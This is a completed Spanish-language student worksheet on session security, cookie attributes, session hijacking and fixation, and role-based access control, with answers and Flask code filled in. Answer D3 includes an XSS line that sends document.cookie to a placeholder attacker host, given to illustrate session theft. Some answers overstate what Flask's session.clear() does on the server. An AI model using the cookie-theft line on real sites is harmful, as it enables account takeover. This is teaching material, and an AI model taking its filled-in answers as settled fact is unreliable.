# S3 — GUÍA DE TRABAJO DEL ESTUDIANTE
## Autenticación, Gestión de Cookies y Niveles de Acceso

| Campo | Detalle |
|---|---|
| **Curso** | Programación Segura (DD281) — Semana 3 |
| **Nombre del estudiante** | LINDO BARRIENTOS JHONN VIEQUIER |
| **Código** | 2221896680 |
| **Fecha de entrega** | 20/06/2026 |
| **Tiempo estimado** | 1.5 horas |
| **Puntaje total** | 100 puntos |

---

**Instrucciones generales:**
- Trabaja de forma individual y sin consultar respuestas de otros compañeros
- Responde con tus propias palabras — las respuestas copiadas se anulan
- Las secciones A y B se desarrollan en este documento
- Las secciones C y D requieren respuestas en párrafos completos
- Entrega: plataforma del aula virtual en el formato indicado por el docente

---

## SECCIÓN A — OPCIÓN MÚLTIPLE (20 puntos — 2 pts c/u)

*Marca con una X la alternativa correcta. Una sola respuesta por pregunta.*

---

**Pregunta 1** *(Básica)*
HTTP es un protocolo "sin estado" (stateless). Esto significa que:

- a) El servidor guarda automáticamente el estado de cada usuario entre peticiones
- b) Cada petición HTTP es independiente y el servidor no recuerda peticiones anteriores
- c) El cliente debe reenviar su contraseña en cada petición para identificarse
- d) Solo las peticiones POST mantienen el estado del usuario

**Respuesta: [ b ]**

---

**Pregunta 2** *(Básica)*
¿Cuál de los siguientes mecanismos es el MÁS SEGURO para almacenar el session ID de un usuario?

- a) `localStorage` del navegador
- b) `sessionStorage` del navegador
- c) Cookie con atributos `HttpOnly` y `Secure`
- d) Variable global de JavaScript en el cliente

**Respuesta: [ c ]**

---

**Pregunta 3** *(Básica)*
El atributo `HttpOnly` en una cookie:

- a) Garantiza que la cookie solo se transmita por HTTPS
- b) Impide que JavaScript del navegador pueda leer el valor de la cookie
- c) Limita la cookie a peticiones del mismo dominio únicamente
- d) Establece la fecha de expiración automática de la cookie

**Respuesta: [ b ]**

---

**Pregunta 4** *(Básica)*
El atributo `Secure` en una cookie garantiza que:

- a) La cookie no puede ser modificada por el usuario
- b) La cookie solo se transmite sobre conexiones HTTPS, nunca HTTP
- c) JavaScript no puede acceder al valor de la cookie
- d) La cookie expira automáticamente al cerrar el navegador

**Respuesta: [ b ]**

---

**Pregunta 5** *(Intermedia)*
Un desarrollador implementa el logout eliminando la cookie del navegador del usuario, pero no invalida el session ID en el servidor. ¿Cuál es el riesgo?

- a) El usuario tendrá que iniciar sesión dos veces la próxima vez
- b) Un atacante con una copia previa del session ID puede seguir usándolo para acceder al sistema
- c) La base de datos quedará con registros de sesión corruptos
- d) El servidor dejará de funcionar correctamente después del logout

**Respuesta: [ b ]**

---

**Pregunta 6** *(Intermedia)*
¿Qué ataque específico previene el atributo `SameSite=Strict` en una cookie?

- a) SQL Injection en formularios de autenticación
- b) XSS (Cross-Site Scripting) en páginas dinámicas
- c) CSRF (Cross-Site Request Forgery) desde dominios externos
- d) Brute force en el formulario de login

**Respuesta: [ c ]**

---

**Pregunta 7** *(Intermedia)*
En el ataque Session Fixation, el atacante:

- a) Adivina el session ID del usuario usando fuerza bruta
- b) Fuerza al usuario a utilizar un session ID ya conocido por el atacante antes de autenticarse
- c) Inyecta código JavaScript para robar la cookie del usuario
- d) Intercepta el tráfico de red para capturar el session ID

**Respuesta: [ b ]**

---

**Pregunta 8** *(Avanzada)*
En RBAC (Role-Based Access Control), el Principio de Mínimo Privilegio establece que:

- a) Los administradores deben tener acceso a todos los recursos para gestionar el sistema
- b) Cada usuario debe tener únicamente los permisos estrictamente necesarios para su función
- c) Los permisos se asignan individualmente a cada usuario según su antigüedad
- d) Los roles deben definirse con el máximo de permisos posibles para no limitar la productividad

**Respuesta: [ b ]**

---

**Pregunta 9** *(Avanzada)*
Un sistema lee el rol del usuario desde el campo oculto del formulario HTML: `<input type="hidden" name="role" value="usuario">`. ¿Cuál es la vulnerabilidad?

- a) Inyección SQL, porque el campo contiene texto sin parametrizar
- b) Parameter tampering — el usuario puede editar el campo con DevTools y darse el rol "admin"
- c) CSRF, porque el formulario puede ser enviado desde otro dominio
- d) Session Fixation, porque el role está en el cliente antes de la autenticación

**Respuesta: [ b ]**

---

**Pregunta 10** *(Avanzada)*
Un navegador moderno recibe `Set-Cookie: session=abc; SameSite=None` sin el atributo `Secure`. ¿Qué ocurre?

- a) El navegador acepta la cookie y la envía en todas las peticiones
- b) El navegador rechaza y descarta la cookie automáticamente
- c) El navegador convierte la cookie a SameSite=Lax automáticamente
- d) La cookie funciona normalmente pero genera una advertencia en la consola

**Respuesta: [ b ]**

---

## SECCIÓN B — COMPLETAR Y RELACIONAR (20 puntos)

### B1 — Completar espacios en blanco (10 puntos — 2 pts c/u)

Banco: `HttpOnly` / `session.clear()` / `servidor` / `Secure` / `RBAC` / `SameSite` / `session_id` / `stateless`

1. HTTP es un protocolo **stateless** porque no recuerda peticiones anteriores entre cliente y servidor.

2. El atributo **Secure** garantiza que la cookie de sesión no sea transmitida sobre conexiones HTTP no cifradas.

3. El modelo de control de acceso **RBAC** asigna permisos a través de roles, no directamente a usuarios individuales.

4. En un logout correcto, además de eliminar la cookie del cliente, el **servidor** debe invalidar el session ID en su propio almacén.

5. Para prevenir Session Fixation, después de una autenticación exitosa se debe ejecutar **session.clear()** para limpiar la sesión previa.

---

### B2 — Relacionar columnas (10 puntos)

| Columna A | | Columna B |
|---|---|---|
| 1. `HttpOnly` | **c** | a) Controla si la cookie se envía en peticiones cross-site |
| 2. `Secure` | **f** | b) El servidor no puede recordar peticiones anteriores |
| 3. `SameSite=Lax` | **a** | c) Previene que JavaScript lea el valor de la cookie |
| 4. Session Hijacking | **e** | d) El atacante forza un session ID conocido antes del login |
| 5. Session Fixation | **d** | e) Robo de un session ID válido para suplantar al usuario |
| 6. Stateless | **b** | f) La cookie solo viaja sobre conexiones HTTPS |
| 7. Mínimo Privilegio | **h** | g) Conjunto de permisos asignados a un tipo de usuario |
| 8. Rol | **g** | h) Cada usuario tiene solo los permisos que necesita |

**Resumen:** 1→c, 2→f, 3→a, 4→e, 5→d, 6→b, 7→h, 8→g

---

## SECCIÓN C — ANÁLISIS Y REFLEXIÓN (30 puntos)

*Responde con párrafos completos de 3-5 líneas. No uses listas en esta sección.*

---

**Pregunta C1 (10 puntos)**

*Tu respuesta:*

Guardar el session ID en `localStorage` es un riesgo porque ese almacenamiento es accesible desde JavaScript mediante `localStorage.getItem()`, de modo que cualquier vulnerabilidad XSS permitiría a un atacante leer el identificador y robar la sesión. Además, `localStorage` no ofrece los mecanismos de protección de una cookie (no tiene `HttpOnly`, `Secure` ni `SameSite`) y persiste incluso tras cerrar la pestaña. La alternativa correcta es almacenar el session ID en una **cookie con `HttpOnly`** (para que JavaScript no pueda leerla, neutralizando el robo por XSS), **`Secure`** (para que solo viaje por HTTPS) y **`SameSite`** (para mitigar CSRF). Así el manejo de la sesión queda del lado del navegador y del servidor, no expuesto al script de la página.

---

**Pregunta C2 (10 puntos)**

*Tu respuesta:*

En el **Session Hijacking** el atacante **roba un session ID válido ya existente** —típicamente mediante XSS, sniffing de red o acceso físico— después de que la víctima inició sesión, y lo reutiliza para suplantarla. En el **Session Fixation** la mecánica es inversa: el atacante **fija o impone un session ID que él ya conoce** en el navegador de la víctima **antes** del login, y cuando esta se autentica sobre ese mismo identificador, el atacante puede reusarlo. Ambos comparten el mismo objetivo final: **suplantar la sesión de la víctima** sin conocer su contraseña. La medida que previene el hijacking es proteger el token con `HttpOnly`, `Secure` y TLS para que no pueda robarse; la que previene la fixation es **regenerar el session ID tras el login** (en Flask, `session.clear()` antes de asignar los datos), de modo que el identificador previo quede inservible.

---

**Mini caso de análisis — RetailFácil**

**Pregunta C3a (5 puntos)**

*Tu respuesta:*

El diseño expone el **rol y el uid en una cookie de texto plano** (`role=comprador; uid=456`): el usuario puede editarla con DevTools y cambiarla a `role=admin` o a otro `uid`, logrando **parameter tampering** y suplantación. El **precio enviado como campo oculto** y leído tal cual por el backend permite **manipular el precio** (`precio=1.00`) y pagar mucho menos de lo real. Y la **ausencia de expiración de sesión** mantiene válida indefinidamente cualquier cookie capturada o abandonada, ampliando la ventana para un secuestro de sesión.

**Pregunta C3b (5 puntos)**

*Tu respuesta:*

El rol y el uid deben guardarse **del lado del servidor** en la sesión firmada (en Flask, `session`), nunca en una cookie editable por el cliente, aplicando el principio de **no confiar en el cliente / autoridad en el servidor**. El **precio debe calcularse y validarse en el servidor** a partir del ID del producto consultado en la base de datos, ignorando cualquier valor enviado por el formulario, aplicando **validación del lado del servidor / nunca confiar en la entrada**. La cookie de sesión debe llevar `HttpOnly`, `Secure` y `SameSite` (**protección del token de sesión**), y la sesión debe tener **timeout de expiración** (gestión de sesiones / minimizar la ventana de exposición).

---

## SECCIÓN D — PREGUNTAS AVANZADAS Y DE CASO (30 puntos)

### Caso profesional — SaludNet Perú (15 puntos)

**Pregunta D1 (5 puntos)**

*Tu respuesta:*

Están presentes **A01:2021 — Broken Access Control**, que se manifiesta como un **IDOR**: un médico cambia `paciente_id=1023` por `1024` en la URL y accede a historias clínicas que no le corresponden, porque el servidor no verifica la propiedad/autorización del recurso. **A02:2021 — Cryptographic Failures**, porque el sistema opera sobre **HTTP sin cifrar** y la cookie no tiene `Secure`, exponiendo datos de salud sensibles en tránsito. Y **A07:2021 — Identification and Authentication Failures**, porque la cookie de sesión **sin `HttpOnly` ni `Secure`** es robable (por XSS o sniffing), permitiendo suplantar usuarios. De forma complementaria, hay **A05:2021 — Security Misconfiguration** por no redirigir HTTP a HTTPS y por la configuración insegura de cookies.

**Pregunta D2 (5 puntos)**

*Tu respuesta:*

**Roles y permisos:**
- **Paciente:** solo puede ver **sus propios** resultados de laboratorio.
- **Médico:** puede ver historias clínicas **únicamente de los pacientes asignados** a él.
- **Administrador:** gestiona usuarios y configuración; no accede a historias clínicas salvo para auditoría controlada.

La clave del decorador es verificar **rol + propiedad del recurso** (esto corrige el IDOR), no solo el rol:

```python
from functools import wraps
from flask import session, redirect, url_for, abort

def require_acceso_historia(f):
    @wraps(f)
    def inner(paciente_id, *args, **kwargs):
        # 1. ¿Autenticado?
        if 'user_id' not in session:
            return redirect(url_for('login'))
        rol = session.get('user_role')
        uid = session.get('user_id')
        # 2. Autorización por rol + propiedad del recurso
        if rol == 'paciente' and paciente_id != uid:
            abort(403)                      # un paciente solo ve lo suyo
        elif rol == 'medico' and paciente_id not in pacientes_asignados(uid):
            abort(403)                      # médico solo ve sus pacientes
        elif rol not in ('paciente', 'medico', 'admin'):
            abort(403)
        return f(paciente_id, *args, **kwargs)
    return inner
```

**Pregunta D3 (5 puntos)**

*Tu respuesta:*

Como la cookie no tiene `HttpOnly`, un script inyectado por XSS puede leerla con `document.cookie` y enviarla al servidor del atacante (por ejemplo, `new Image().src='http://atacante/?c='+document.cookie`). El atacante recibe el session ID válido del paciente, lo **inyecta en su propio navegador** (con DevTools o una extensión) y, al recargar el sitio de SaludNet, el servidor lo reconoce como ese paciente: ha realizado un **Session Hijacking** sin conocer la contraseña. El atributo que lo hubiera prevenido es **`HttpOnly`**, que impide que JavaScript acceda al valor de la cookie; junto con `Secure` para que no viaje por HTTP.

---

**Pregunta D4 — Diseño y propuesta (8 puntos)**

*Tu código:*

```python
# Gestión de sesiones para un sistema bancario en Flask
from flask import Flask, session, redirect, url_for, request, abort
from functools import wraps
from datetime import timedelta, datetime
import secrets

app = Flask(__name__)

# Clave de firma de la cookie de sesión: aleatoria y de alta entropía
app.config['SECRET_KEY'] = secrets.token_hex(32)

# Cookie segura contra XSS y CSRF
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,     # JS no puede leer la cookie -> mitiga robo por XSS
    SESSION_COOKIE_SECURE=True,       # la cookie solo viaja por HTTPS
    SESSION_COOKIE_SAMESITE='Strict', # no se envía en peticiones cross-site -> mitiga CSRF
)
# Expiración absoluta de la sesión
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=15)

def login_usuario(email, rol):
    session.clear()                    # previene Session Fixation: nuevo ID tras autenticar
    session['user_id']   = email
    session['user_role'] = rol
    session['last_activity'] = datetime.utcnow().isoformat()
    session.permanent = True           # aplica PERMANENT_SESSION_LIFETIME

@app.before_request
def control_inactividad():
    # Timeout de 15 min por INACTIVIDAD (sliding): si pasó el límite, cerrar sesión
    if 'user_id' in session:
        ultima = session.get('last_activity')
        if ultima:
            inactivo = datetime.utcnow() - datetime.fromisoformat(ultima)
            if inactivo > timedelta(minutes=15):
                session.clear()
                return redirect(url_for('login'))
        session['last_activity'] = datetime.utcnow().isoformat()  # renovar actividad

def require_role(*roles):
    def decorator(f):
        @wraps(f)
        def inner(*args, **kwargs):
            if 'user_id' not in session:        # autenticación
                return redirect(url_for('login'))
            if session.get('user_role') not in roles:  # autorización (RBAC)
                abort(403)
            return f(*args, **kwargs)
        return inner
    return decorator

@app.route('/logout')
def logout():
    session.clear()    # invalida la sesión en el SERVIDOR (no solo borra la cookie)
    return redirect(url_for('login'))

# Ejemplos de RBAC con roles cliente / operador / admin
@app.route('/transferir')
@require_role('cliente')
def transferir(): ...

@app.route('/aprobar-operacion')
@require_role('operador', 'admin')
def aprobar(): ...

@app.route('/gestion-usuarios')
@require_role('admin')
def gestion(): ...
```

*Nota: para CSRF, además de `SameSite=Strict`, en producción se añadiría un token CSRF por formulario (p. ej. Flask-WTF) en las operaciones POST sensibles como transferencias.*

---

**Pregunta D5 — Pensamiento crítico (7 puntos)**

*Tu respuesta:*

Aunque `HttpOnly` y `Secure` impiden **robar** la cookie por XSS o por HTTP, no sirven de nada si el session ID es **predecible**: con identificadores secuenciales (`1001, 1002, 1003...`) se habilita un ataque de **predicción/enumeración de sesiones (session prediction)**. El atacante observa su propio ID, deduce el patrón y simplemente prueba valores cercanos (`1002`, `1004`, …) colocándolos como su cookie de sesión hasta caer en la sesión activa de otro usuario, suplantándolo sin necesidad de robar nada. El estándar correcto es generar los session IDs con un **generador criptográficamente seguro (CSPRNG)** y **alta entropía** —OWASP recomienda al menos 64 bits efectivos, idealmente 128— por ejemplo con `secrets.token_urlsafe(32)`/`secrets.token_hex(32)`. En Flask, como la sesión se firma con `SECRET_KEY`, esa clave debe ser aleatoria y de alta entropía para que el contenido no pueda falsificarse.

---

*Universidad Autónoma del Perú — DD281 Programación Segura — Semana 3 — 2026-1*
